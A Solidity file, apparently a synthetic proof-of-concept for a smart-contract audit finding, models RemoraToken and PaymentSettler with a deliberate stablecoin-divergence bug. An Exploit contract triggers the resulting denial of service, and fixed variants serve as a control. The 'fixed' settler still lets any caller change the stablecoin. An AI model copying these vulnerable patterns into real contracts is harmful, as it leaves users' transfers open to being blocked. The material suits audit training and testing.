// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

/*
 * Synthetic PoC for AuditVault finding 61177 (Remora Pledge, Cyfrin / Dacian).
 *
 * "PaymentSettler can change stablecoin but RemoraToken can't resulting in
 *  corrupted state with DoS for core functions"
 *
 * RemoraToken stores its own `stablecoin` with NO setter (the inherited
 * DividendManager.changeStablecoin was removed when PaymentSettler was
 * introduced). PaymentSettler CAN change its own `stablecoin`. Once
 * PaymentSettler.changeStablecoin() runs, RemoraToken.stablecoin diverges
 * from PaymentSettler.stablecoin, and the core fee-settlement path — which
 * requires the two to match — reverts permanently: a DoS on every fee-bearing
 * transfer.
 *
 * The FAITHFUL MINIMAL doubles below model both contracts plus a core
 * transfer-with-fee function that settles through PaymentSettler.
 */

/// @dev Minimal ERC20-ish token used for the stablecoin(s) and the DoS marker.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public decimals;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s, uint8 d) {
        name = n;
        symbol = s;
        decimals = d;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "ALLOWANCE");
        allowance[from][msg.sender] = a - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "BALANCE");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

/// @dev VULNERABLE PaymentSettler. Verbatim mechanism from the finding: it can
///      change its own stablecoin, but nothing keeps RemoraToken in sync.
contract PaymentSettler {
    address public stablecoin;

    error InvalidAddress();

    constructor(address _stablecoin) {
        stablecoin = _stablecoin;
    }

    function changeStablecoin(address newStablecoin) external {
        if (newStablecoin == address(0)) revert InvalidAddress();
        stablecoin = newStablecoin; // @> changes PaymentSettler.stablecoin; RemoraToken.stablecoin has no setter -> permanent mismatch
    }

    /// @notice Core fee settlement. Requires the caller's (RemoraToken's)
    ///         stablecoin to match this settler's stablecoin. Reverts forever
    ///         once the two diverge -> DoS on every fee-bearing transfer.
    function settleTransferFee(address tokenStablecoin, address payer, uint256 fee) external {
        require(tokenStablecoin == stablecoin, "STABLECOIN_MISMATCH"); // reverts once RemoraToken diverges
        MiniToken(stablecoin).transferFrom(payer, address(this), fee);
    }
}

/// @dev VULNERABLE RemoraToken. Has a `stablecoin` member with the finding's
///      exact intent comment, and NO way to update it.
contract RemoraToken {
    address public stablecoin; // make sure same stablecoin is used here that is used in payment settler
    PaymentSettler public settler;
    mapping(address => uint256) public balanceOf;

    constructor(address _stablecoin, address _settler) {
        stablecoin = _stablecoin;
        settler = PaymentSettler(_settler);
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    /// @notice Core function: transfer tokens, charging a fee settled in the
    ///         stablecoin through PaymentSettler. DoS'd once stablecoins diverge.
    function transferWithFee(address to, uint256 amount) external {
        uint256 fee = amount / 10;
        settler.settleTransferFee(stablecoin, msg.sender, fee);
        require(balanceOf[msg.sender] >= amount, "BALANCE");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }
}

// ---------------------------------------------------------------------------
// FIXED variant: RemoraToken no longer stores its own stablecoin; it reads the
// live value from PaymentSettler, so the two can never diverge (mirrors the
// finding's recommended mitigation of removing RemoraToken.stablecoin).
// ---------------------------------------------------------------------------

contract FixedPaymentSettler {
    address public stablecoin;

    error InvalidAddress();

    constructor(address _stablecoin) {
        stablecoin = _stablecoin;
    }

    function changeStablecoin(address newStablecoin) external {
        if (newStablecoin == address(0)) revert InvalidAddress();
        stablecoin = newStablecoin;
    }

    function settleTransferFee(address tokenStablecoin, address payer, uint256 fee) external {
        require(tokenStablecoin == stablecoin, "STABLECOIN_MISMATCH");
        MiniToken(stablecoin).transferFrom(payer, address(this), fee);
    }
}

contract FixedRemoraToken {
    FixedPaymentSettler public settler;
    mapping(address => uint256) public balanceOf;

    constructor(address _settler) {
        settler = FixedPaymentSettler(_settler);
    }

    /// @notice Always in sync: read the stablecoin straight from the settler.
    function stablecoin() public view returns (address) {
        return settler.stablecoin();
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transferWithFee(address to, uint256 amount) external {
        uint256 fee = amount / 10;
        settler.settleTransferFee(stablecoin(), msg.sender, fee);
        require(balanceOf[msg.sender] >= amount, "BALANCE");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }
}

// ---------------------------------------------------------------------------
// Exploit: demonstrates the DoS. Marker token is minted to SINK to record the
// magnitude of the blocked transfer.
// ---------------------------------------------------------------------------

contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    bool public dosOccurred;
    uint256 public blockedAmount;
    MiniToken public marker;

    function run() external payable {
        // Create every helper contract up-front, fixed order (marker LAST).
        MiniToken oldStable = new MiniToken("OLD-USD", "OLD", 6);
        MiniToken newStable = new MiniToken("USDC", "USDC", 6);
        PaymentSettler settler = new PaymentSettler(address(oldStable));
        RemoraToken token = new RemoraToken(address(oldStable), address(settler));
        marker = new MiniToken("DOS-MARKER", "DOS", 18);

        // Preconditions: this contract is a RemoraToken holder wanting to
        // transfer; it holds and approves stablecoin(s) to pay the fee.
        uint256 amount = 100e18;
        token.mint(address(this), amount);
        oldStable.mint(address(this), 1_000_000e18);
        oldStable.approve(address(settler), type(uint256).max);
        newStable.mint(address(this), 1_000_000e18);
        newStable.approve(address(settler), type(uint256).max);

        // Admin/attacker changes PaymentSettler's stablecoin; RemoraToken's
        // stablecoin CANNOT follow (no setter) -> permanent divergence.
        settler.changeStablecoin(address(newStable));

        // Core function now reverts on the stablecoin mismatch: DoS.
        try token.transferWithFee(address(0xBEEF), amount) {
            dosOccurred = false;
        } catch {
            dosOccurred = true;
            blockedAmount = amount;
            marker.mint(SINK, amount); // record blocked-transfer magnitude
        }
    }
}

/// @dev Control: same attack sequence against the FIXED contracts. The transfer
///      succeeds because RemoraToken always reads the settler's current stablecoin.
contract Fixed {
    bool public transferSucceeded;
    uint256 public blockedAmount;

    function run() external {
        MiniToken oldStable = new MiniToken("OLD-USD", "OLD", 6);
        MiniToken newStable = new MiniToken("USDC", "USDC", 6);
        FixedPaymentSettler settler = new FixedPaymentSettler(address(oldStable));
        FixedRemoraToken token = new FixedRemoraToken(address(settler));

        uint256 amount = 100e18;
        token.mint(address(this), amount);
        newStable.mint(address(this), 1_000_000e18);
        newStable.approve(address(settler), type(uint256).max);

        // Same admin action.
        settler.changeStablecoin(address(newStable));

        // No divergence possible: transfer succeeds.
        try token.transferWithFee(address(0xBEEF), amount) {
            transferSucceeded = true;
            blockedAmount = 0;
        } catch {
            transferSucceeded = false;
            blockedAmount = amount;
        }
    }
}
